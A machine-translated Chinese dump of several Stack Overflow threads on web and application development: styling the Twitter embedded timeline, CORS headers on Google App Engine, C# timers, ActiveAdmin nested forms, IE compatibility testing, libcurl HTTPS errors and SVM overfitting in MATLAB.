几天/几周前，我的一些网站的 twitter 小部件停止正确提取数据。事实证明，第 2 版 twitter 小部件已被弃用，而新的嵌入式时间线小部件显然是唯一可行的方法。

[https://dev.twitter.com/blog/planning-for-api-v1-retirement](https://dev.twitter.com/blog/planning-for-api-v1-retirement)

除了这个新的小部件创建了一个 iframe，它可以防止在我自己的样式表中对小部件进行任何自定义样式 - 例如设置字体系列、字体大小、颜色等。

有解决方法吗？从我正在阅读的内容来看，您无法将样式应用/注入到 iframe 中，而且我找不到任何 API 方式来做到这一点。

我还想将小部件限制为仅 3 条最近的推文；不确定这是否可行，并删除垂直滚动条（可能与限制推文有关）。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-09-17T09:48:09.407

您可以尝试将一些内联 css 样式注入到*iframe*内加载的页面头部，而不是使用 jQuery 来定位元素，因此“显示更多”按钮加载的新内容也将被更改：

例如删除头像图片：

```
$("iframe#twitter-widget-0").contents().find('head').append('<style>img.u-photo.avatar{display:none !important;}.header.h-card.p-author{padding-left:0;}</style>'); 
```

我使用**waituntilexists.js**插件来检测何时将内容添加到 DOM 而不是 setTimeout()：[https ://gist.github.com/buu700/4200601](https://gist.github.com/buu700/4200601)

所以我们有：

```
$("iframe#twitter-widget-0").waitUntilExists(function(){
    $("iframe#twitter-widget-0").contents().find('head').append('<style>img.u-photo.avatar{display:none !important;}.header.h-card.p-author{padding-left:0;}</style>');     
}); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-07-08T00:22:08.117

我在 Twitter 的增强时间轴中找到的唯一解决方案是在 iframe 加载后使用 javascript 修改 css。

需要使用 window.setTimeout 。正如 jamesnotjim 所提到的，请确保将其放在正文标记下方的脚本块中。

```
window.setTimeout(function(){
    $(".twitter-timeline").contents().find(".e-entry-title").css("font-family","sans-serif");
    $(".twitter-timeline").contents().find(".tweet").css("font-family","sans-serif");
  }, 1000); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-10-29T14:47:26.910

## 将样式应用于 Twitter 提要

我想以**user2787001**提供的答案为基础。我发现即使使用这种方法（在 iframe 上使用**waituntilexists.js**），样式也并不总是被应用。等待 iFrame 加载很重要，因为 twitter 会即时加载它。然而，iframe 然后必须加载其内容；包含 Twitter 提要的网页，如果这需要比预期更长的时间，我们将再次尝试将样式应用于不存在的内容。最终，我们要检查样式是否已实际应用到 iframe 内的页面上，只有这样我们才能对工作完成感到满意。

为了应用样式，我引用了一个包含适当样式的独立样式表，使用`<link rel="stylesheet"... >`. 为了确保这已经成功应用，我给了它一个 id ( `#twitter-widget-styles`)，可以检查它以确认样式表已被放置。

我没有使用 waituntilexists.js 插件，而是通过使用`window.setInterval`. **不要** `window.setTimeout`随意延迟使用。很可能 twitter iframe 及其内容的加载时间比预期的要长。如果延迟太短，样式将无法应用。如果延迟太长，那么您的用户会看到[一闪而过的无样式内容 (FOUC)](http://en.wikipedia.org/wiki/Flash_of_unstyled_content)

（注意：`#twitter-widget-0`是 twitter 在其 iframe 上使用的 id）

```
//Add twitter widget styling
var $iframeHead;

var twitterStylesTimer = window.setInterval(function(){

    $iframeHead = $("iframe#twitter-widget-0").contents().find('head');

    if( !$('#twitter-widget-styles', $iframeHead).length ){ //If our stylesheet does not exist tey to place it
        $iframeHead.append('<link rel="stylesheet" href="/stylesheets/twitter-widget.css" id="twitter-widget-styles">');
    }else if( $('#twitter-widget-styles', $iframeHead).length ){    //If stylesheet exists then quit timer
        clearInterval(twitterStylesTimer);
    }

}, 200); 
```

## 限制检查次数

一个小考虑，如果 iframe 无法加载或样式表永远不会被应用，计时器将无限期地运行。如果这是一个问题，可以添加计数器以在一定次数的尝试后退出该过程：

```
//Add twitter widget styling
var quitStyleCount = 0;
var $iframeHead;

var twitterStylesTimer = window.setInterval(function(){

    $iframeHead = $("iframe#twitter-widget-0").contents().find('head');

    if( !$('#twitter-widget-styles', $iframeHead).length ){ //If our stylesheet does not exist tey to place it
        $iframeHead.append('<link rel="stylesheet" href="/stylesheets/twitter-widget.css" id="twitter-widget-styles">');
    }else if( $('#twitter-widget-styles', $iframeHead).length || ++quitStyleCount > 40){    //If stylesheet exists or we've been trying for too long then quit
        clearInterval(twitterStylesTimer);
    }

}, 200); 
```

延迟时间（示例中为 200 毫秒）和中断计数器（40 个周期）可以根据需要进行更改。

## 跨域限制

至于关于将代码插入 iframe 的问题。如果我们查看 twitter 呈现的 iframe，它没有`src`可以从另一个域中提取内容的属性：

```
<iframe frameborder="0" height="200" id="twitter-widget-0" scrolling="no" allowtransparency="true" class="twitter-timeline twitter-timeline-rendered" allowfullscreen="" style="border: medium none; max-width: 100%; min-width: 180px; width: 520px;" title="Twitter Timeline"></iframe> 
```

我尚未对此进行全面调查，但我希望 iframe 内容是从客户端计算机上运行的 twitter 脚本动态生成的。因此与其交互不会违反任何跨域限制。

## 限制推文数量

要限制推文的数量，请使用`data-tweet-limit="x"`嵌入代码中使用的锚标记上的属性

```
<a class="twitter-timeline" data-tweet-limit="3" href="https://twitter.com/xxxxxxxxxxxx" data-widget-id="xxxxxxxxxxxxx">Tweets by xxxxxxxxxx</a>... 
```

这在[twitter 文档](https://dev.twitter.com/web/embedded-timelines#options)中进行了讨论：

> **推文限制**：要将时间线的大小固定为预设的推文数量，请使用 data-tweet-limit="5" 属性和 1 到 20 条推文之间的任何值。时间线将从时间线渲染指定数量的推文，扩展小部件的高度以显示所有推文而无需滚动。由于小部件具有固定大小，因此在使用此选项时它不会轮询更新。

## 移除垂直滚动条

我需要查看您的代码才能给出明确的答案。有一个属性可以解决您的问题，再次在[twitter 文档](https://dev.twitter.com/web/embedded-timelines#options)中讨论，在“Chrome”部分下：

```
data-chrome="noscrollbar" 
```

> **noscrollbar**：裁剪并隐藏主时间轴滚动条（如果可见）。请考虑隐藏标准用户界面组件可能会影响您网站的可访问性。

CSS 样式还可以通过诸如`overflow: hidden`.

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-06-12T10:24:33.030

我至少可以帮助限制推文和删除滚动条。

从[文档](https://dev.twitter.com/docs/embedded-timelines)中：

> **推文限制：**要将时间线的大小固定为预设的推文数量，请使用 data-tweet-limit="5" 属性和 1 到 20 条推文之间的任何值。

和

> **Chrome：**使用嵌入代码上的 data-chrome="nofooter transparent" 属性控制小部件布局和 chrome。使用以空格分隔的以下选项集：noheader、nofooter、noscrollbar、transparent。

还在看造型。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-03-20T21:27:45.210

您可以在自己的项目中导入 twitter-widget.js javascript，然后在此 .js 文件中修改一些样式。

之后，您调用它而不是调用 twitter 的站点库`//your.ownsite.web/widgets.js`。它实际上是有效的，但对未来没有任何保证。

```
 <a class="twitter-timeline" href="https://twitter.com/twitterapi" data-widget-id="YOUR-WIDGET-ID-HERE">Tweets by @twitterapi</a>

<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script> 
```

在 .js 中，查找以下代码块：

```
setupSandbox: function (a) {
                var b = a.doc,
                    c = b.createElement("base"),
                    d = b.createElement("style"),
                    f = b.getElementsByTagName("head")[0],
                    g = "body{display:none} .timeline{border:1px solid #CCCCCC} .timeline-header{background-color:#F3F3F3;padding:8px 14px;-moz-border-radius:5px 5px 0 0;-webkit-border-radius:5px 5px 0 0;border-radius:5px 5px 0 0;} .timeline-header h1.summary{background-color:#F3F3F3; border-bottom:1px solid #EBEBEB; -moz-border-radius:5px 5px 0 0; -webkit-border-radius:5px 5px 0 0; border-radius:5px 5px 0 0; font-size:14px; font-weight:400; line-height:18px; margin:0; padding:0;};",
                    h = this,
                    i; 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-10-15T09:26:57.333

去这个网站下载这个插件，然后你可以用你选择 [Jason Mayes的任何方式来设计](http://jasonmayes.com/projects/twitterApi/)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-04-09T20:45:22.003

[请参阅此处](https://dev.twitter.com/docs/embedded-timelines)的“客户端选项” 。但基本上，您可以在样式化的 div 中拍打整个东西，删除页眉和页脚并使背景透明。我个人仍在寻找一种方法来限制推文数量并摆脱用户图标。

这是我们的代码（Drupal 块）： 好的，我无法让代码很好地显示。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2014-02-06T05:19:26.957

**这对我有用**

```
function twitterfix() {

    if(typeof $("#twitter-widget-0").contents().find(".load-more").html() == 'undefined') {
        setTimeout(twitterfix, 500);
        }
    else {
        var head = $("#twitter-widget-0").contents().find("head");
        head.append('<link type="text/css" rel="stylesheet" href="wp-content/themes/mywordpresstheme/style.css">');
        head.append('<style>.h-entry.tweet.with-expansion.customisable-border {border-bottom: 1px solid #EFEEEE;}</style>');
        }
}

$(document).ready(function () {

    twitterfix();

}); 
```

wiki.workassis.com

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2016-03-04T16:30:22.727

我发现只要将小部件包装在容器中，您就可以在没有 settimeout 的情况下使用准备好的文档。这不仅应该在页面加载时触发，还应该在页面加载后时间线本身的任何动态内容更改时触发。

```
jQuery(document).ready( function() {
   jQuery('.twitter-block').on('DOMSubtreeModified propertychange',"#twitter-widget-0", function() {
     //your element changes here.
     //Hide media items
     jQuery(".twitter-timeline").contents().find(".timeline-Tweet-media").css("display", "none");
     //Resize iframe when new content is posted.
     jQuery(".twitter-block").css("height", "100%");
   });
}); 
```

否则，我同意 a-gorsky 关于在 iframe 中添加样式表而不是对每个元素进行样式更改的看法。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2013-04-18T14:08:34.907

In the Microsoft MVC world there are helpers in the Microsoft.Web.Helpers library, specifically using:

```
@Twitter.Profile(... 
```

The above is just a wrapper around the V2 widget, but indicates there is a high usage of that particular widget.

I've looked into your question for a while now (in fact when the deprecation message started appearing) and I have come to the following conclusions:

1.  The widget will not be deprecated due to its wide use
2.  If it is deprecated a far richer timeline widget will be available
3.  Failing this it will be the case of using the API and writing our own widgets, which will be a step back for Twitter

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2013-07-18T05:38:40.907

时间线将 iframe 插入到页面中，那么为什么不直接获取 iframe 的内容并对其进行处理呢？

例如，这是使用 jquery 完成的方法：

`$($('#IFRAME_ID').contents().find('body'))`

您现在拥有完整的 twitter 提要作为 DOM 树，随心所欲。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2013-06-17T17:37:56.117

设置推文数量很简单：

推文限制：要将时间线的大小固定为预设的推文数量，请使用 data-tweet-limit="5" 属性和 1 到 20 条推文之间的任何值。时间线将从时间线渲染指定数量的推文，扩展小部件的高度以显示所有推文而无需滚动。由于小部件具有固定大小，因此在使用此选项时它不会轮询更新。

不知道如何删除用户图标。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2014-02-26T17:50:47.477

如果您查看[widgets.js](http://platform.twitter.com/widgets.js)并查找此行：

```
e.appendStyleSheet(twttr.widgets.config.assetUrl() + "/" + r("embed/timeline.css"))).then(p.bind(function() { 
```

您可以复制[timeline.css](http://platform.twitter.com/embed/timeline.css)并随意修改这两个文件。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2013-06-12T20:49:51.803

这就是我所做的。如果您限制帖子的数量，它会自动删除滑块。

```
<a  class="twitter-timeline"  href="https://twitter.com/YOUR_ACCOUNT_NAME"  data-widget-id="YOUR_ID_HERE" data-tweet-limit="4">Tweets by @YOUR_ACCOUNT_NAME</a> 
```

# google-app-engine - GWT Font-awesome 无法在 Firefox 上正确显示

> ID：15533977
> 
> 赞同：2
> 
> 时间：2013-03-20T20:25:55.970
> 
> 标签：google-app-engine, firefox, cross-domain, font-awesome

即使在 localhost 中，我也无法在 firefox 中正确显示 font-awesome。我收到一个跨域错误，正是[这里](https://stackoverflow.com/questions/11872404/font-awesome-not-properly-displaying-on-firefox-how-to-vend-via-cdn)报告的内容。

解决这个问题的方法是将以下内容添加到 .htaccess 或直接添加到 apache config：

```
<FilesMatch "\.(ttf|otf|eot|woff)$">
  <IfModule mod_headers.c>
    Header set Access-Control-Allow-Origin "*"
  </IfModule>
</FilesMatch> 
```

但是我在 Google App Engine 中托管我的应用程序，那么如何在 GAE 中设置 Access-Control-Allow-Origin？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T23:28:13.320

如果您使用的是 Java，请编辑您的`appengine-web.xml`文件以包含类似的内容

```
<static-files>
  <include path="/my_static-files" >
    <http-header name="Access-Control-Allow-Origin" value="*" />
  </include>
</static-files> 
```

或者避免使用`value=*`@mabn 指出的潜在安全问题。

```
<static-files>
  <include path="/my_static-files" >
    <http-header name="Access-Control-Allow-Origin" value="http://example.org" />
  </include>
</static-files> 
```

如果您使用的是 Python，请编辑您的`app.yaml`文件以包含类似的内容

```
- url: /images
  static_dir: static/images
  http_headers:
    Access-Control-Allow-Origin: * 
```

有关更多详细信息以及如何使其更适合您的配置，请参阅[Python 应用](https://developers.google.com/appengine/docs/python/config/appconfig)程序配置的[Java 应用程序配置。](https://developers.google.com/appengine/docs/java/config/appconfig)

# c# - 获取 System.Windows.Forms.Timer 的值？

> ID：15533982
> 
> 赞同：4
> 
> 时间：2013-03-20T20:26:06.117
> 
> 标签：c#, windows, forms, timer

windows窗体计时器有一点问题。这是一个非常基本的问题，但我环顾四周，似乎找不到答案（我可能应该得到一记耳光）。

我需要能够获取计时器的值，它的经过时间是否大于 500 毫秒的间隔。

就像是

```
Timer.Elapsed >= 500 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-20T20:27:46.927

`Timer.Elapsed`不是返回“经过的时间”的属性 - 这是您订阅的*事件。*这个想法是该事件每隔一段时间就会触发一次。

目前还不清楚您是否甚至*想要*一个`Timer`- 也许[`System.Diagnostics.Stopwatch`](http://msdn.microsoft.com/en-gb/library/system.diagnostics.stopwatch.aspx)真的是您所追求的？

```
var stopwatch = Stopwatch.StartNew();
// Do some work here

if (stopwatch.ElapsedMilliseconds >= 500)
{
    ...
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-20T20:27:35.300

> 我需要能够获取计时器的值，它的经过时间是否大于 500 毫秒的间隔。

计时器不提供允许您确定已经过去了多少时间的界面。他们唯一做的就是在过期时触发一个事件。

您需要使用其他一些机制（例如[`Stopwatch`](http://msdn.microsoft.com/en-gb/library/system.diagnostics.stopwatch.aspx)类）来记录时间的流逝。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T20:30:08.347

将 Timer 的 Interval 属性设置为您想要触发的毫秒数（在您的示例中为 500），并为 Tick 事件添加一个事件处理程序。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:38:44.540

我写得很快，可能有一些错误，但给你一个大致的想法

```
Timer timer = new System.Windows.Forms.Timer();
timer.Interval = 500;
timer.Elapsed += (s,a) => {
  MyFunction();
  timer.Stop();
}
timer.Start(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T20:28:14.357

你不能用`Timer`. `Elapsed`是达到 0 时触发的事件。

如果您想在事件结束时收听，请注册一个 listen to `Elapsed`。`Interval`是设置等待时间的成员。

见这里： http: [//msdn.microsoft.com/en-us/library/system.timers.timer (v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/system.timers.timer(v=vs.100).aspx)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-06-05T14:02:08.107

我提出了一个很简单的解决方案：

1 - 在启动计时器之前，我将当前时间存储在`TotalMillisseconds`（来自`DateTime.Now.TimeOfDay.TotalMilliseconds`）：

```
double _startingTime = DateTime.Now.TimeOfDay.TotalMilliseconds; 
```

2 - 每次计时器滴答作响，我都会再次获得当前时间，然后我使用一个`double`变量来获得这两者之间的差异：

```
double _currentTime = DateTime.Now.TimeOfDay.TotalMilliseconds;
double _elapsed = _currentTime - _startingTime;

if(_elapsed >= 500)
{
    MessageBox.Show("As you command, master!");
    _startingTime = _currentTime;
}

if(_currentTime < _startingTime)
    _startingTime = _currentTime; 
```

3 - 最后，因为`TotalMilliseconds`将返回自 00:00（下午 12 点）以来经过的毫秒数，这意味着当它是午夜时，`TotalMilliseconds`将等于 0。在这种情况下，我只检查 是否`_currentTime`低于`_startingTime`，如果是这样，将 设置`_startingTime`为`_currentTime`，以便我可以再次计算。

我希望这有帮助

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-12-23T16:47:30.037

根据我[在这里](https://stackoverflow.com/a/15534019/2321042)与 David关于`Stopwatch`vs的讨论`DateTime`，我决定针对需要获得剩余时间的情况发布两种方法（非常简化），以便您决定哪一种更适合您：

```
public partial class FormWithStopwatch : Form
{
    private readonly Stopwatch sw = new Stopwatch();
    // Auxiliary member to avoid doing TimeSpan.FromMilliseconds repeatedly
    private TimeSpan timerSpan;

    public void TimerStart()
    {
        timerSpan = TimeSpan.FromMilliseconds(timer.Interval);
        timer.Start();
        sw.Restart();
    }

    public TimeSpan GetRemaining()
    {
        return timerSpan - sw.Elapsed;
    }

    private void timer_Tick(object sender, EventArgs e)
    {
        // Do your thing
        sw.Restart();
    }
}

public partial class FormWithDateTime : Form
{
    private DateTime timerEnd;

    public void TimerStart()
    {
        timerEnd = DateTime.Now.AddMilliseconds(timer.Interval);
        timer.Start();
    }

    public TimeSpan GetRemaining()
    {
        return timerEnd - DateTime.Now;
    }

    private void timer_Tick(object sender, EventArgs e)
    {
        // Do your thing
        timerEnd = DateTime.Now.AddMilliseconds(timer.Interval);
    }
} 
```

老实说，我没有看到使用`Stopwatch`. 实际上，使用`DateTime`. 此外，后者对我来说似乎更清楚一点。

# ruby-on-rails-3 - ActiveAdmin 表单不允许批量分配

> ID：15533988
> 
> 赞同：4
> 
> 时间：2013-03-20T20:26:20.920
> 
> 标签：ruby-on-rails-3, activeadmin, nested-attributes, formtastic

我是一个项目的新手，并试图向已经有一堆移动部件的系统添加一个功能，我认为其中大部分与我试图添加的功能完全无关。

我想向 ActiveAdmin/Formtastic 表单添加字段，以允许用户创建和更新与产品相关的定价方案。每个产品都有一个定价方案，可以有多个定价层。

这些字段显示在表单上，​​但是当我更新产品对象时，定价层对象中的费用和最大属性不会保存到数据库中

ActiveAdmin 表单有一个变量，pricing_scheme_object，它是我根据[这个 Stack Overflow Answer](https://stackoverflow.com/a/8768035/1339631)创建的。ActiveAdmin 表单如下所示：

```
ActiveAdmin.register Product do
  actions :all, except: [:destroy]
  # menu parent, filters, and scopes, none of which are related
  form html: {multipart: true} do |f|
    f.inputs "Product" do
      # unrelated code
      pricing_scheme_object = [:pricing_scheme, f.object.pricing_scheme ||
                               PricingScheme.new]
      f.inputs "Pricing Schemes", :for => pricing_scheme_object do |scheme|
        scheme.has_many :pricing_tiers do |tier|
          tier.input :fee, input_html: { class: 'pricing_scheme_column'}, size: 5
          tier.input :max, input_html: { class: 'pricing_scheme_column'}, size: 5
        end
      end
      # unrelated code
    end
    f.actions
  end
  # unrelated code
end 
```

当我保存产品时，我在服务器上看到以下内容：

```
Started PUT "/admin/products/139" for 127.0.0.1 at 2013-03-20 12:50:43 -0700
Processing by Admin::ProductsController#update as HTML
  Parameters: {"utf8"=>"✓", "authenticity_token"=>"FzyjTkrTF0LvB1K02kebSgqDQWad8c5/bpbIEhFgQpY=", "product"=>{"three_letter_acronym_id"=>"64", "name"=>"test pdf", "description"=>"<p>this is the pdf </p><div class=\"vimiumReset vimiumHUD\" style=\"right: 150px; opacity: 0; display: none; \"></div>", "status"=>"published", "way"=>"pdf", "custom_path"=>"", "pricing_scheme"=>{"pricing_tiers_attributes"=>{"1363809038085"=>{"fee"=>"30", "max"=>"10"}}}, "allocation_rule_number"=>"", "fulfillment_email"=>"", "fulfillment_username"=>"", "fulfillment_password"=>"[FILTERED]", "fulfillment_url"=>"",  "shared_secret"=>"", "api_key"=>"", "callback_url"=>""}, "commit"=>"Update Product", "id"=>"139"}
  Product Load (0.4ms)  SELECT `products`.* FROM `products` WHERE `products`.`id` = 139 LIMIT 1
WARNING: Can't mass-assign protected attributes: pricing_scheme
   (0.1ms)  BEGIN
[paperclip] Saving attachments.
   (0.1ms)  COMMIT
Redirected to http://localhost:3000/admin/products/139
Completed 302 Found in 119ms (ActiveRecord: 0.0ms)

Started GET "/admin/products/139" for 127.0.0.1 at 2013-03-20 12:50:43 -0700
Processing by Admin::ProductsController#show as HTML
  Parameters: {"id"=>"139"}
  Product Load (0.3ms)  SELECT `products`.* FROM `products` WHERE `products`.`id` = 139 LIMIT 1
  ThreeLetterAcronym Load (0.4ms)  SELECT `three_letter_acronym`.* FROM `three_letter_acronym` WHERE `three_letter_acronym`.`id` = 64 LIMIT 1
  Rendered /Users/strand/.rvm/gems/ruby-1.9.3-p392/bundler/gems/active_admin-c3be25319bb6/app/views/active_admin/resource/show.html.arb (27.3ms)
Completed 200 OK in 144ms (Views: 29.0ms | ActiveRecord: 0.6ms) 
```

产品看起来像这样：

```
# app/models/product.rb
class Product < ActiveRecord::Base
  # … (probably unrelated code)
  has_one  :pricing_scheme, dependent: :destroy
  accepts_nested_attributes_for :pricing_scheme, allow_destroy: true, reject_if: lambda { |a| a[:price].blank? }
  # … 
  attr_accessible :unrelated_attributes,
                  :pricing_scheme_attributes,
                  :pricing_scheme_id
  # …
end 
```

定价方案模型为：

```
# app/models/pricing_scheme.rb
class PricingScheme < ActiveRecord::Base

  attr_accessible :display_order, :label, :product_id, :max_quantity,
                  :min_quantity, :price, :category, :pricing_tiers_attributes

  has_many   :pricing_tiers
  belongs_to :product

  accepts_nested_attributes_for :pricing_tiers, :allow_destroy => true

  def price_for(number)
    # logic to determine the price for a number of products based on the pricing 
    # tiers associated with the pricing scheme.
  end
end 
```

定价层如下所示：

```
# app/models/pricing_tier.rb
class PricingTier < ActiveRecord::Base
  attr_accessible :fee, :max, :base, :pricing_scheme_id

  belongs_to :pricing_scheme
end 
```

当我保存产品时，我想更新或创建定价方案以及与之关联的任何定价层。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T14:56:09.340

您正在 PUT 获得许可，因此您可能需要`accepts_nested_attributes_for :pricing_tiers`in 许可？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T03:08:01.393

尝试添加`:pricing_scheme`为中的第一个对象`pricing_scheme_object array`，即

```
f.inputs "Pricing Schemes", :for => [:pricing_scheme, f.object.pricing_scheme || PricingScheme.new] do |scheme|
  scheme.has_many :pricing_tiers do |tier|
    tier.input :fee, input_html: { class: 'pricing_scheme_column'}, size: 5
    tier.input :max, input_html: { class: 'pricing_scheme_column'}, size: 5
  end
end 
```

问题似乎是传入`params[:pricing_scheme]`而不是`params[:pricing_scheme_attributes]`，并且根据您构建输入的答案，字段名称应该在`:for`选项中传递，以告诉它它们应该用于哪些属性。

# internet-explorer - IE9 兼容模式是测试 IE7-8 的有效方法吗？

> ID：15533990
> 
> 赞同：2
> 
> 时间：2013-03-20T20:26:28.880
> 
> 标签：internet-explorer, testing, cross-browser

在需要 IE8 支持的网站上工作。我正在基于 VMWare fusion 的 IE8 上测试该站点——而我的同事正在打开兼容模式的 IE9 上的 Windows 中进行本地测试。我们看到的网站版本非常不同，我的 VMWare IE8 最接近客户在他们的 IE8 上看到的内容。

兼容模式下的 IE9 是 IE8 的有效测试吗？如果不是，它的目的是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T20:28:56.867

兼容性视图旨在模拟 IE7 使用的渲染引擎，而不是 IE8 的渲染引擎。这适用于所有具有该功能的版本，包括 8、9 和 10。这可能就是您的同事看到您和您的客户的不同结果的原因。

在 IE9 上测试 IE8 兼容性的正确方法是使用 F12 开发人员工具，该工具允许您从 IE5.5（怪癖）、IE7（兼容性）、IE8 以及以后的任何主要版本中选择一种呈现模式到正在使用的那个。

兼容性视图的目的是提供与依赖旧代码的旧网站的兼容性，这些旧代码又依赖于 IE7 和更早版本中的不正确/不一致的行为，这在 IE8 和更高版本中并不那么严重或普遍。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-20T21:06:36.160

要在各种旧版本的 IE 中进行测试......这就是你要做的......

1.  在 IE9（或 IE10）中，按 F12
2.  开发人员工具将打开。将“浏览器模式”和“文档模式”更改为您想要的任何内容（即 IE7、IE8 甚至臭名昭著的 Quirks 模式）。

这是一个屏幕截图： ![在此处输入图像描述](../Images/8a7c5fc3f592af6ed2cef6bc9736427e.png)

# ssl - 构建 libcurl 在运行时为 HTTPS 生成“不支持的协议”

> ID：15533995
> 
> 赞同：1
> 
> 时间：2013-03-20T20:26:37.760
> 
> 标签：ssl, curl, libcurl

我正在为我们的应用程序重建 libcurl，但在运行时遇到以下问题（libcurl 构建良好）：

> [20:03:24] 警告：API 调用失败：putStatus() 中的 cURL 错误：不支持的协议

（输出来自我们的代码，“ `Unsupported protocol`”来自 curl）

现在你会认为这只是 curl 没有在`SSL`支持下构建的问题，但是我们的 configure 语句的结尾清楚地表明它是：

```
configure: Configured to build curl/libcurl:

  curl version:     7.29.0
  Host setup:       armv6l-unknown-linux-gnueabihf
  Install prefix:   /usr/local
  Compiler:         gcc
  SSL support:      enabled (OpenSSL) 
```

> [snip] 协议：DICT 文件 FTP FTPS GOPHER HTTP HTTPS IMAP IMAPS POP3 POP3S RTMP RTSP SCP SFTP SMTP SMTPS TELNET TFTP

关于为什么我们的 curl 可能会有这种行为的任何指示？

# matlab - 为什么使用 SVM 的分类结果在 matlab 中不好？

> ID：15533997
> 
> 赞同：-1
> 
> 时间：2013-03-20T20:26:40.927
> 
> 标签：matlab, machine-learning, classification, svm

我对 svm 有一些问题。我使用 svmtrain 和 svmclassify 进行分类质量和无质量。我有数据训练 40 个假阳性和 13 个真阳性。当我测试它时（我使用的数据测试 = 数据训练）正在工作并且准确地给出了 100%。但是当我测试它时（数据测试我从数据训练中取出）数据训练（TP=8 FP=30）和数据测试（TP=5 FP=10）。结果使所有数据误报。对这个问题有任何想法吗？还是因为测试和训练的数据量少？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T09:23:33.053

独立测试集表现不佳是很正常的，这意味着您的模型显然倾向于过度拟合，因为您在拟合训练数据时获得了 100%。尝试调整 svm 模型参数，应用数据预处理，尤其是标准化以降低您对训练的适应度和（希望）您的独立测试数据。当两个精度接近时，模型将有效。